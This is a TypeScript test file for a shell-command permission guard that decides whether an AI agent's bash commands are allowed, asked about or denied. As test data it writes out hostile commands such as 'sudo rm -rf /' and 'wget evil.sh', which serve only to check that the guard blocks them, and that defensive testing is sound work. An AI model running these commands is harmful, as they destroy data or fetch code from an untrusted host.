import { describe, expect, it } from "vitest";
import fs from "fs";
import os from "os";
import path from "path";
import { beforeExecute } from "../enforce.js";
import { createBashGuardHooks } from "../adapter.js";
import type { BashGuardHooks, PermissionReplyInput } from "../adapter.js";
import type { PluginConfig } from "../config.js";
import type { RestructureConfig } from "../plugin-config.js";

const nativeAskAll: PluginConfig = {
  bashRules: [
    { pattern: "*", action: "ask" },
    { pattern: "git *", action: "allow" },
    { pattern: "sudo *", action: "deny" },
  ],
  editRules: [],
  externalDirectoryRules: [{ pattern: "./**", action: "allow" }],
  externalDirectoryDefault: "ask",
  toolPermissions: [],
  enabled: true,
};

const enabled: RestructureConfig = { enabled: true, maxSegments: 3, maxDepth: 2 };
const disabled: RestructureConfig = { enabled: false, maxSegments: 3, maxDepth: 2 };

function runHooks(tool: string, command: string, config: PluginConfig, restructure: RestructureConfig, degraded = false) {
  const prompts: Array<"ask" | "deny" | "allow"> = [];
  const result = beforeExecute(tool, "/project", { command }, config, restructure, degraded);

  if (result.rejectionMessage) {
    return { result, prompts, thrown: result.rejectionMessage };
  }

  if (result.chainAction === "ask" || result.chainAction === "deny") {
    const output: { status: "ask" | "deny" | "allow" } = { status: "ask" };
    if (result.permissionOverride !== null) output.status = result.permissionOverride;
    prompts.push(output.status);
  }

  return { result, prompts, thrown: null };
}

interface HooksFixture {
  readonly hooks: BashGuardHooks;
  readonly replies: PermissionReplyInput[];
}

function createHooks(directory: string): HooksFixture {
  const replies: PermissionReplyInput[] = [];
  return {
    hooks: createBashGuardHooks({
      directory,
      replyPermission: async (reply) => {
        replies.push(reply);
      },
    }),
    replies,
  };
}

async function configureAskAndDeny(
  hooks: BashGuardHooks,
  bashPermissions: { readonly [pattern: string]: "ask" | "allow" | "deny" } = { "*": "ask", "git *": "allow", "sudo *": "deny" },
): Promise<void> {
  const config = hooks.config;
  expect(config).toBeDefined();
  await config?.({ permission: { bash: bashPermissions } });
}

async function runBefore(
  hooks: BashGuardHooks,
  input: { readonly sessionID: string; readonly callID: string; readonly command: string },
): Promise<void> {
  const before = hooks["tool.execute.before"];
  expect(before).toBeDefined();
  await before?.({ tool: "Bash", callID: input.callID, sessionID: input.sessionID }, { args: { command: input.command } });
}

async function runPermissionAsk(
  fixture: HooksFixture,
  input: { readonly sessionID: string; readonly callID?: string },
): Promise<"ask" | "allow" | "deny"> {
  const event = fixture.hooks.event;
  const replyCount = fixture.replies.length;
  await event({
    event: {
      type: "permission.asked",
      properties: {
        id: `request-${replyCount}`,
        sessionID: input.sessionID,
        tool: input.callID === undefined ? undefined : { messageID: `message-${replyCount}`, callID: input.callID },
      },
    },
  });
  const reply = fixture.replies[replyCount];
  if (reply === undefined) return "ask";
  return reply.response === "once" ? "allow" : "deny";
}

interface ArgsAllowFixture {
  readonly hooks: BashGuardHooks;
  readonly replies: PermissionReplyInput[];
  readonly cleanup: () => void;
}

async function createArgsAllowFixture(): Promise<ArgsAllowFixture> {
  const project = fs.mkdtempSync(path.join(os.tmpdir(), "obg-allow-"));
  const previousXdgConfigHome = process.env.XDG_CONFIG_HOME;
  fs.mkdirSync(path.join(project, ".opencode"), { recursive: true });
  fs.writeFileSync(
    path.join(project, ".opencode", "opencode-bash-guard.jsonc"),
    JSON.stringify({
      matcherVersion: 2,
      permissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
    }),
  );
  process.env.XDG_CONFIG_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "obg-xdg-"));

  const fixture = createHooks(project);
  await configureAskAndDeny(fixture.hooks);

  return {
    hooks: fixture.hooks,
    replies: fixture.replies,
    cleanup: () => {
      if (previousXdgConfigHome === undefined) delete process.env.XDG_CONFIG_HOME;
      else process.env.XDG_CONFIG_HOME = previousXdgConfigHome;
      fs.rmSync(project, { recursive: true, force: true });
    },
  };
}

describe("characterization: prompt cardinality per path", () => {
  it("allow → 0 prompts, no stored decision, no wrap", () => {
    const { result, prompts } = runHooks("Bash", "git status", nativeAskAll, enabled);
    expect(result.chainAction).toBe("allow");
    expect(result.shouldWrap).toBe(false);
    expect(prompts).toHaveLength(0);
  });

  it("no-opinion → 0 prompts, no wrap", () => {
    const config: PluginConfig = {
      bashRules: [{ pattern: "git *", action: "allow" }],
      editRules: [],
      externalDirectoryRules: [],
      externalDirectoryDefault: null,
      toolPermissions: [],
      enabled: true,
    };
    const { result, prompts } = runHooks("Bash", "ls -la", config, enabled);
    expect(result.chainAction).toBeNull();
    expect(result.shouldWrap).toBe(false);
    expect(prompts).toHaveLength(0);
  });

  it("ask → exactly 1 prompt, wrapped, decision consumed single-use", () => {
    const { result, prompts } = runHooks("Bash", "wget evil.sh", nativeAskAll, enabled);
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
    expect(prompts).toEqual(["ask"]);
  });

  it("deny → exactly 1 prompt trigger forced to deny, wrapped", () => {
    const { result, prompts } = runHooks("Bash", "sudo rm -rf /", nativeAskAll, enabled);
    expect(result.chainAction).toBe("deny");
    expect(result.shouldWrap).toBe(true);
    expect(prompts).toEqual(["deny"]);
  });

  it("chained ask → exactly 1 prompt for the whole chain", () => {
    const { result, prompts } = runHooks("Bash", "git status && wget evil.sh", nativeAskAll, enabled);
    expect(result.chainAction).toBe("ask");
    expect(prompts).toEqual(["ask"]);
  });

  it("nested ($()) ask → exactly 1 prompt", () => {
    const { result, prompts } = runHooks("Bash", "echo $(wget evil.sh)", nativeAskAll, enabled);
    expect(result.chainAction).toBe("ask");
    expect(prompts).toEqual(["ask"]);
  });

  it("empty command → 0 prompts, no wrap, no stored decision", () => {
    const { result, prompts } = runHooks("Bash", "", nativeAskAll, enabled);
    expect(result.chainAction).toBeNull();
    expect(result.shouldWrap).toBe(false);
    expect(prompts).toHaveLength(0);
  });

  it("disabled plugin path (non-bash tool) → 0 prompts", () => {
    const { result, prompts } = runHooks("Edit", "anything", nativeAskAll, enabled);
    expect(result.chainAction).toBeNull();
    expect(result.shouldWrap).toBe(false);
    expect(prompts).toHaveLength(0);
  });

  it("parse error → 1 deny prompt, wrapped, fail-closed", () => {
    const { result, prompts } = runHooks("Bash", 'echo "unbalanced', nativeAskAll, enabled);
    expect(result.chainAction).toBe("deny");
    expect(result.shouldWrap).toBe(true);
    expect(prompts).toEqual(["deny"]);
  });

  it("degraded mode → 1 ask prompt even for glob-allowed commands", () => {
    const { result, prompts } = runHooks("Bash", "git status", nativeAskAll, enabled, true);
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
    expect(prompts).toEqual(["ask"]);
  });

  it("args-level allow → 0 native prompts (forced allow via stored decision)", () => {
    const config: PluginConfig = {
      ...nativeAskAll,
      toolPermissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
    };
    const { result, prompts } = runHooks("Bash", "curl -X GET https://api.com", config, enabled);
    expect(result.chainAction).toBe("allow");
    expect(result.shouldWrap).toBe(false);
    expect(result.permissionOverride).toBe("allow");
    expect(prompts).toHaveLength(0);
  });
});

describe("characterization: command wrapping", () => {
  it("ask and deny results request wrapping", () => {
    expect(beforeExecute("Bash", "/project", { command: "wget evil.sh" }, nativeAskAll, enabled).shouldWrap).toBe(true);
    expect(beforeExecute("Bash", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled).shouldWrap).toBe(true);
  });

  it("allow, no-opinion, empty, and readability-rejected results never wrap", () => {
    expect(beforeExecute("Bash", "/project", { command: "git status" }, nativeAskAll, enabled).shouldWrap).toBe(false);
    expect(
      beforeExecute("Bash", "/project", { command: "ls" }, { bashRules: [], editRules: [], externalDirectoryRules: [], externalDirectoryDefault: null, toolPermissions: [], enabled: true }, enabled)
        .shouldWrap,
    ).toBe(false);
    expect(beforeExecute("Bash", "/project", { command: "" }, nativeAskAll, enabled).shouldWrap).toBe(false);
    const complex = "git status && rm -rf /tmp/x && echo ok && ls";
    expect(beforeExecute("Bash", "/project", { command: complex }, nativeAskAll, enabled).shouldWrap).toBe(false);
  });

  it("tool name matching is case-insensitive; non-bash tools ignored", () => {
    expect(beforeExecute("bash", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled).chainAction).toBe("deny");
    expect(beforeExecute("Bash", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled).chainAction).toBe("deny");
    expect(beforeExecute("Read", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled).chainAction).toBeNull();
  });
});

describe("characterization: readability thresholds and messages", () => {
  it("strictly-greater thresholds: N == max passes, N+1 rejected", () => {
    expect(runHooks("Bash", "git a && git b && rm -rf /tmp/x", nativeAskAll, enabled).thrown).toBeNull();
    const over = runHooks("Bash", "git a && git b && git c && rm -rf /tmp/x", nativeAskAll, enabled);
    expect(over.thrown).not.toBeNull();
    expect(over.thrown).toContain("4 chained commands");
    expect(over.thrown).toContain("nesting depth 1");
    expect(over.thrown).toContain("Re-issue as separate bash tool calls");
  });

  it("rejection fires only on ask; deny and allow flows unchanged", () => {
    const denyConfig: PluginConfig = {
      ...nativeAskAll,
      bashRules: [
        { pattern: "*", action: "ask" },
        { pattern: "git *", action: "allow" },
        { pattern: "git push *", action: "deny" },
      ],
    };
    const denyCmd = "git push --force && git status && git log && git show";
    const denyResult = beforeExecute("Bash", "/project", { command: denyCmd }, denyConfig, enabled);
    expect(denyResult.rejectionMessage).toBeNull();
    expect(denyResult.chainAction).toBe("deny");

    const allowCmd = "git status && git log && git diff && git show";
    const allowResult = beforeExecute("Bash", "/project", { command: allowCmd }, nativeAskAll, enabled);
    expect(allowResult.rejectionMessage).toBeNull();
    expect(allowResult.chainAction).toBe("allow");
  });

  it("no-opinion chains are never rejected", () => {
    const config: PluginConfig = {
      bashRules: [],
      editRules: [],
      externalDirectoryRules: [],
      externalDirectoryDefault: null,
      toolPermissions: [],
      enabled: true,
    };
    const result = beforeExecute("Bash", "/project", { command: "a && b && c && d" }, config, enabled);
    expect(result.rejectionMessage).toBeNull();
    expect(result.chainAction).toBeNull();
  });

  it("parse errors fail closed before readability runs", () => {
    const result = beforeExecute("Bash", "/project", { command: 'echo "unbalanced' }, nativeAskAll, enabled);
    expect(result.chainAction).toBe("deny");
    expect(result.rejectionMessage).toBeNull();
  });

  it("multi-line: per-line limit names the worst line", () => {
    const cmd = "git a && git b && git c && git d && rm -rf /tmp/x\ngit e && git f";
    const { result } = runHooks("Bash", cmd, nativeAskAll, enabled);
    expect(result.rejectionMessage).toContain("Complex command rejected (line 1: 5 chained commands");
  });

  it("multi-line one-command-per-line re-issue passes the gate", () => {
    const cmd = "git status\nrm -rf /tmp/x\necho ok\nls";
    const { result, thrown } = runHooks("Bash", cmd, nativeAskAll, enabled);
    expect(thrown).toBeNull();
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
  });

  it("depth threshold: single $() passes, double $() rejected", () => {
    expect(runHooks("Bash", "echo $(whoami)", nativeAskAll, enabled).thrown).toBeNull();
    const over = runHooks("Bash", "echo $(echo $(whoami))", nativeAskAll, enabled);
    expect(over.thrown).toContain("nesting depth 3");
  });

  it("inline-script statement count over threshold rejected with interpreter name", () => {
    const cmd = `git status && python3 -c "import os; os.system('a'); os.system('b'); os.system('c'); os.system('d')"`;
    const { result, thrown } = runHooks("Bash", cmd, nativeAskAll, enabled);
    expect(thrown).toContain("Complex inline script rejected (python -c: 5 statements)");
    expect(result.shouldWrap).toBe(false);
  });

  it("feature disabled — complex ask chain follows the plain ask flow", () => {
    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
    const { result, thrown } = runHooks("Bash", cmd, nativeAskAll, disabled);
    expect(thrown).toBeNull();
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
  });

  it("repeated violation re-throws with the same message (no retry counter)", () => {
    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
    const first = runHooks("Bash", cmd, nativeAskAll, enabled);
    const second = runHooks("Bash", cmd, nativeAskAll, enabled);
    expect(second.thrown).toBe(first.thrown);
  });

  it("rejected ask chain requests no permission override", () => {
    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
    const { result } = runHooks("Bash", cmd, nativeAskAll, enabled);
    expect(result.permissionOverride).toBeNull();
  });
});

describe("instance-owned permission handoff", () => {
  it("Given disabled native config, when before and permission hooks run, then command and status stay untouched", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks, { "*": "allow" });
    const before = hooks["tool.execute.before"];
    if (before === undefined) throw new Error("missing before hook");

    const input = { sessionID: "disabled", callID: "disabled", command: "sudo rm -rf /" };
    const output = { args: { command: input.command } };
    await before({ tool: "Bash", callID: input.callID, sessionID: input.sessionID }, output);

    expect(output.args.command).toBe(input.command);
    expect(await runPermissionAsk(fixture, input)).toBe("ask");
  });

  it("Given enabled hooks, when permission.asked lacks or does not recognize a callID, then no reply is sent", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);
    const knownInput = { sessionID: "known", callID: "known", command: "sudo rm -rf /" };
    await runBefore(hooks, knownInput);

    expect(await runPermissionAsk(fixture, { sessionID: "missing" })).toBe("ask");
    expect(await runPermissionAsk(fixture, { sessionID: "unknown", callID: "unknown" })).toBe("ask");
    expect(await runPermissionAsk(fixture, knownInput)).toBe("deny");
  });

  it("Given an args-level allow, when permission.asked fires twice, then only the first event is allowed", async () => {
    const project = fs.mkdtempSync(path.join(os.tmpdir(), "obg-allow-"));
    const previousXdgConfigHome = process.env.XDG_CONFIG_HOME;
    fs.mkdirSync(path.join(project, ".opencode"), { recursive: true });
    fs.writeFileSync(
      path.join(project, ".opencode", "opencode-bash-guard.jsonc"),
      JSON.stringify({
        matcherVersion: 2,
        permissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
      }),
    );
    process.env.XDG_CONFIG_HOME = path.join(os.tmpdir(), `obg-xdg-${Date.now()}`);

    try {
      const fixture = createHooks(project);
      const { hooks } = fixture;
      await configureAskAndDeny(hooks);

      const input = { sessionID: "session", callID: "allow-once", command: "curl -X GET https://api.example" };
      await runBefore(hooks, input);
      expect(await runPermissionAsk(fixture, input)).toBe("allow");
      expect(await runPermissionAsk(fixture, input)).toBe("ask");
    } finally {
      if (previousXdgConfigHome === undefined) delete process.env.XDG_CONFIG_HOME;
      else process.env.XDG_CONFIG_HOME = previousXdgConfigHome;
      fs.rmSync(project, { recursive: true, force: true });
    }
  });

  it("Given a denied command, when permission.asked fires twice, then only the first event is rejected", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const input = { sessionID: "session", callID: "deny-once", command: "sudo rm -rf /" };
    await runBefore(hooks, input);
    expect(await runPermissionAsk(fixture, input)).toBe("deny");
    expect(await runPermissionAsk(fixture, input)).toBe("ask");
  });

  it("Given a repeated key, when deny is replaced by an args-rule allow, then the fresh allow wins", async () => {
    const fixture = await createArgsAllowFixture();
    try {
      const deniedInput = { sessionID: "replacement", callID: "same", command: "sudo rm -rf /" };
      const allowedInput = { sessionID: "replacement", callID: "same", command: "curl -X GET https://api.example" };
      await runBefore(fixture.hooks, deniedInput);
      await runBefore(fixture.hooks, allowedInput);

      expect(await runPermissionAsk(fixture, allowedInput)).toBe("allow");
    } finally {
      fixture.cleanup();
    }
  });

  it("Given a repeated key, when an args-rule allow is replaced by deny, then the fresh deny wins", async () => {
    const fixture = await createArgsAllowFixture();
    try {
      const allowedInput = { sessionID: "replacement", callID: "same", command: "curl -X GET https://api.example" };
      const deniedInput = { sessionID: "replacement", callID: "same", command: "sudo rm -rf /" };
      await runBefore(fixture.hooks, allowedInput);
      await runBefore(fixture.hooks, deniedInput);

      expect(await runPermissionAsk(fixture, deniedInput)).toBe("deny");
    } finally {
      fixture.cleanup();
    }
  });

  it("Given a native ask, when before executes, then permission.asked sends no reply", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const nativeAsk = { sessionID: "session", callID: "native-ask", command: "wget evil.sh" };
    await runBefore(hooks, nativeAsk);
    expect(await runPermissionAsk(fixture, nativeAsk)).toBe("ask");
  });

  it("Given a native allow, when before executes, then permission.asked sends no reply", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const nativeAllow = { sessionID: "session", callID: "native-allow", command: "git status" };
    await runBefore(hooks, nativeAllow);
    expect(await runPermissionAsk(fixture, nativeAllow)).toBe("ask");
  });

  it("Given one callID in two sessions, when each session asks, then only its own handoff applies", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const sessionADeny = { sessionID: "session-a", callID: "shared", command: "sudo rm -rf /" };
    const sessionBAsk = { sessionID: "session-b", callID: "shared", command: "wget evil.sh" };
    await runBefore(hooks, sessionADeny);
    await runBefore(hooks, sessionBAsk);

    expect(await runPermissionAsk(fixture, sessionADeny)).toBe("deny");
    expect(await runPermissionAsk(fixture, sessionBAsk)).toBe("ask");
  });

  it("Given the same session and callID in two hook instances, when each instance asks, then only its own handoff applies", async () => {
    const firstFixture = createHooks("/project");
    const secondFixture = createHooks("/project");
    const firstHooks = firstFixture.hooks;
    const secondHooks = secondFixture.hooks;
    await configureAskAndDeny(firstHooks);
    await configureAskAndDeny(secondHooks);

    const deniedInput = { sessionID: "session", callID: "shared", command: "sudo rm -rf /" };
    const askInput = { sessionID: "session", callID: "shared", command: "wget evil.sh" };
    await runBefore(firstHooks, deniedInput);
    await runBefore(secondHooks, askInput);

    expect(await runPermissionAsk(firstFixture, deniedInput)).toBe("deny");
    expect(await runPermissionAsk(secondFixture, askInput)).toBe("ask");
  });

  it("Given a reused pair, when a non-storing path follows a denial, then the stale handoff is cleared", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const deniedInput = { sessionID: "session", callID: "reused", command: "sudo rm -rf /" };
    const emptyInput = { sessionID: "session", callID: "reused", command: "" };
    await runBefore(hooks, deniedInput);
    await runBefore(hooks, emptyInput);
    expect(await runPermissionAsk(fixture, deniedInput)).toBe("ask");

    await runBefore(hooks, deniedInput);
    const before = hooks["tool.execute.before"];
    expect(before).toBeDefined();
    await before?.({ tool: "Edit", callID: "reused", sessionID: "session" }, { args: {} });
    expect(await runPermissionAsk(fixture, deniedInput)).toBe("ask");
  });

  it("Given an unconsumed denial, when tool.execute.after runs, then permission.asked sends no reply", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const input = { sessionID: "session", callID: "after", command: "sudo rm -rf /" };
    await runBefore(hooks, input);
    const after = hooks["tool.execute.after"];
    expect(after).toBeDefined();
    await after?.({ tool: "Bash", callID: "after", sessionID: "session", args: {} }, { title: "", output: "", metadata: {} });

    expect(await runPermissionAsk(fixture, input)).toBe("ask");
  });

  it("full sequence: before → permission.asked consumes → after is a safe no-op", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const input = { sessionID: "session", callID: "full-sequence", command: "wget evil.sh" };
    await runBefore(hooks, input);
    expect(await runPermissionAsk(fixture, input)).toBe("ask");
    const after = hooks["tool.execute.after"];
    expect(after).toBeDefined();
    await after?.({ tool: "Bash", callID: input.callID, sessionID: input.sessionID, args: {} }, { title: "", output: "", metadata: {} });
    expect(await runPermissionAsk(fixture, input)).toBe("ask");
  });

  it("Given unconsumed denials, when sessions become idle or deleted, then their handoffs are cleared", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    const idleInput = { sessionID: "idle-session", callID: "idle", command: "sudo rm -rf /" };
    const deletedInput = { sessionID: "deleted-session", callID: "deleted", command: "sudo rm -rf /" };
    const idleSurvivor = { sessionID: "idle-survivor", callID: "idle-survivor", command: "sudo rm -rf /" };
    const deletedSurvivor = { sessionID: "deleted-survivor", callID: "deleted-survivor", command: "sudo rm -rf /" };
    await runBefore(hooks, idleInput);
    await runBefore(hooks, deletedInput);
    await runBefore(hooks, idleSurvivor);
    await runBefore(hooks, deletedSurvivor);
    const event = hooks.event;
    expect(event).toBeDefined();
    await event?.({ event: { type: "session.idle", properties: { sessionID: "idle-session" } } });
    await event?.({ event: { type: "session.deleted", properties: { info: { id: "deleted-session" } } } });

    expect(await runPermissionAsk(fixture, idleInput)).toBe("ask");
    expect(await runPermissionAsk(fixture, deletedInput)).toBe("ask");
    expect(await runPermissionAsk(fixture, idleSurvivor)).toBe("deny");
    expect(await runPermissionAsk(fixture, deletedSurvivor)).toBe("deny");
  });

  it("Given callbacks captured before disposal, when config and before run afterward, then they cannot mutate state", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);
    const staleConfig = hooks.config;
    const staleBefore = hooks["tool.execute.before"];
    const staleEvent = hooks.event;
    if (staleConfig === undefined || staleBefore === undefined) throw new Error("missing lifecycle hooks");

    await hooks.dispose?.();
    await configureAskAndDeny({ ...hooks, config: staleConfig });

    const input = { sessionID: "disposed", callID: "disposed", command: "sudo rm -rf /" };
    const output = { args: { command: input.command } };
    await staleBefore({ tool: "Bash", callID: input.callID, sessionID: input.sessionID }, output);

    expect(output.args.command).toBe(input.command);
    await staleEvent({
      event: {
        type: "permission.asked",
        properties: { id: "disposed-request", sessionID: input.sessionID, tool: { messageID: "disposed-message", callID: input.callID } },
      },
    });
    expect(fixture.replies).toHaveLength(0);
  });

  it("Given more than 256 pending denials, when the oldest is consumed, then it remains denied", async () => {
    const fixture = createHooks("/project");
    const { hooks } = fixture;
    await configureAskAndDeny(hooks);

    for (let index = 0; index < 257; index += 1) {
      await runBefore(hooks, { sessionID: "deny-capacity", callID: `deny-${index}`, command: "sudo rm -rf /" });
    }

    expect(await runPermissionAsk(fixture, { sessionID: "deny-capacity", callID: "deny-0" })).toBe("deny");
  });

  it("Given more than 256 pending args-rule allows, when the oldest is consumed, then it remains allowed", async () => {
    const fixture = await createArgsAllowFixture();
    try {
      for (let index = 0; index < 257; index += 1) {
        await runBefore(fixture.hooks, { sessionID: "allow-capacity", callID: `allow-${index}`, command: "curl -X GET https://api.example" });
      }

      expect(await runPermissionAsk(fixture, { sessionID: "allow-capacity", callID: "allow-0" })).toBe("allow");
    } finally {
      fixture.cleanup();
    }
  });

  it("Given two instances with pending denials, when one is disposed, then only that instance clears handoffs and stale callbacks cannot apply them", async () => {
    const disposedFixture = createHooks("/project");
    const activeFixture = createHooks("/project");
    const disposedHooks = disposedFixture.hooks;
    const activeHooks = activeFixture.hooks;
    await configureAskAndDeny(disposedHooks);
    await configureAskAndDeny(activeHooks);

    const disposedInput = { sessionID: "session", callID: "disposed", command: "sudo rm -rf /" };
    const activeInput = { sessionID: "session", callID: "active", command: "sudo rm -rf /" };
    await runBefore(disposedHooks, disposedInput);
    await runBefore(activeHooks, activeInput);
    const staleEvent = disposedHooks.event;
    expect(disposedHooks.dispose).toBeDefined();
    await disposedHooks.dispose?.();

    await staleEvent({
      event: {
        type: "permission.asked",
        properties: { id: "disposed-request", sessionID: "session", tool: { messageID: "disposed-message", callID: "disposed" } },
      },
    });
    expect(disposedFixture.replies).toHaveLength(0);
    expect(await runPermissionAsk(activeFixture, activeInput)).toBe("deny");
  });
});
